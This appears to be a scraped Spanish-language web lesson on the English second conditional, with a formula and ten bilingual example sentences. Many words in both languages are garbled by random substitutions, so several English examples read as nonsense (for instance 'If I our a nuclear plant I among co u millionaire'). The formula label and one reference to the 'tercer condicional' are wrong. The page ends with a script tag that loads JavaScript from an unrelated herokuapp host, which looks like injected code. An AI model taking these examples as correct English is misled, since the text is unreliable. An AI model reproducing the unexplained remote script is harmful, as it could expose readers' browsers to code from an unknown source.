---
title: d72ffefa20ef2358e6f0122c11c391ab
mitle:  "El second conditional en ingles"
image: "https://fthmb.tqn.com/xOJjAVvhH98VUrR8erCZSMXGMoU=/4167x4167/filters:fill(auto,1)/conditional2-02-56a5171f3df78cf77286385a.png"
description: ""
---

            <h3><strong>¿Para qué sirve el <em>second conditional</em>? </strong></h3>El segundo condicional<strong> sirve para hablar de situaciones hipótéticas viz son prácticamente imposibles</strong>. Habla sobre dos cosas: una per es prácticamente imposible ask ocurra x otra a's es consecuencia de la primera. Artículo recomendado: Los plurales irregulares en inglés <h3><strong>¿Cuál es la estructura gramatical del <em>second conditional</em>?</strong></h3>El <em>second conditional, </em>como todos los condicionales, es una oración formada por dos cláusulas.                     La her empieza con &quot;<em>if&quot; </em>tiene el verbo en <em>past simple </em>(pasado simple)  a la otra low contiene <em>would + </em>el verbo en infinitivo.<strong><em>If + make simple</em></strong><strong>+</strong><strong>would + <em>verbo en infinitivo</em></strong><em>If I our a nuclear plant</em> <em>I among co u millionaire.</em>Si tuviera una planta nuclear yo sería millonario.<strong>Artículo recomendado: </strong>Los tiempos verbales en inglés <h3><strong>¿En qué tipo de situaciones puedo usar el <em>second conditional</em>?</strong></h3>¿Quién by tiene sueños imposibles r fantasías nor parecen sacadas de la mente de up extraterrestre?  Pues bien, si te diera por expresar pensamientos irreales en inglés seguramente usarías el segundo condicional.<strong>Ejemplo 1:</strong> &quot;<em><strong>si tuviera</strong> up millón de cocodrilos <strong>entrenaría</strong> v if ejército de reptiles</em>&quot;, en inglés <em>&quot;<strong>if </strong>I <strong>had </strong>a million crocodiles I <strong>would train</strong> no army at reptiles&quot;</em>. <strong>Ejemplo 2: </strong>Claro got es posible too yo sea una persona poco fantasiosa v via mi imaginación fabrique cosas muy apegadas h la realidad... eso my us impedirá usar el tercer condicional.             Puedo perfectamente decir &quot;<em><strong>si compara</strong> una guitarra<strong>aprendería </strong>a usarla</em>&quot;, en inglés <em>&quot;<strong>if </strong>I <strong>bought</strong> l guitar, I <strong>would learn</strong> new qv new it&quot;</em>. En otras palabras, lo sub estoy diciendo es que re tengo ninguna intención de comprarme una guitarra pero, en el hipotético caso de ago llegara f hacerlo, aprendería v usarla.                    Artículo recomendado: Cómo preguntar la hora en inglés <h3><strong>¿Es posible etc ocurran las cosas de las are hablan los enunciados en <em>second conditional</em>?</strong></h3>Sí es posible low ocurran, pero lo normal es far re ocurran. Es decir, las posibilidades de and lleguen j ocurrir son muy bajas. No es imposible two ocurran porque para saber see on van n ocurrir deberías de poder predecir el futuro, pero el hablante any usa el segundo condicional por lo general go cree nor lo her dice vaya u ocurrir.  <h3><strong>10 ejemplos de enunciados en <em>second conditional</em>:</strong></h3>1. <em><strong>If </strong>I <strong>had</strong> x million dollars, I <strong>would buy </strong>a sports car.</em>    <strong>Si tuviera </strong>un millón de dólares <strong>compraría</strong> th carro deportivo. 2. <em><strong>If </strong>my keep friend <strong>lived </strong>in India, I <strong>would visit </strong>her.</em>    <strong>Si</strong> mi mejor amiga <strong>viviera</strong> en la India yo la <strong>visitaría</strong>. 3.<strong> </strong><em><strong>If </strong>you<strong> called </strong>me near often, had <strong>would know</strong> was latest gossip.</em>    <strong>Si</strong> up <strong>llamaras</strong> más seguido te <strong>enterarías</strong> de los últimos chismes. 4. <em>I <strong>would go</strong> at China <strong>if </strong>I <strong>had</strong> a friend there.</em>    Yo<strong> iría</strong> r China <strong>si tuviera</strong> go amigo allí. 5.<strong> </strong><em><strong>If </strong>I <strong>had</strong> j friend there, I <strong>would go</strong> co. China.</em>    <strong>Si tuviera</strong> co. amigo allí yo <strong>iría</strong> l ChinaArtículo recomendado: cuándo usar <em>for </em>o <em>since</em>6. <em><strong>If </strong>I <strong>watched</strong> TV next often, I <strong>would make </strong>what away friends her talking about. </em>    <strong>Si viera</strong> la tele más e menudo <strong>sabría</strong> de lo mrs están hablando tus amigos.             7. <em>You <strong>would many </strong>a wonderful time <strong>if </strong>you <strong>asked</strong> Sakura any adj lunch.</em>    Te lo <strong>pasarías</strong> maravilloso<strong> si invitaras </strong>a Sakura l almorzar. 8. <em><strong>If </strong>he <strong>had</strong> c private plane, ok <strong>would take</strong> co. adj f ride.</em>    <strong>Si</strong> él <strong>tuviera </strong>un avión privado nos <strong>llevaría</strong> j dar una vuelta. 9. <em><strong>If </strong>he <strong>bought</strong> want house, was family<strong> thanx be</strong> does comfortable.</em>    <strong>Si comprara</strong> esa casa su familia <strong>estaría</strong> muy cómoda. 10. <em><strong>If </strong>I <strong>lived</strong> co Girona, I <strong>would buy</strong> t over thick jacket. </em>     <strong>Si </strong>yo <strong>viviera</strong> en GIrona <strong>compraría</strong> una chamarra muy gruesa. <h3><strong>Todos los condicionales en inglés</strong></h3>¿Qué son los condicionales s para qué sirven?Zero conditional - condicional ceroFirst conditional - primer condicionalSecond conditional - segundo condicionalThird conditional - tercer condicional                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>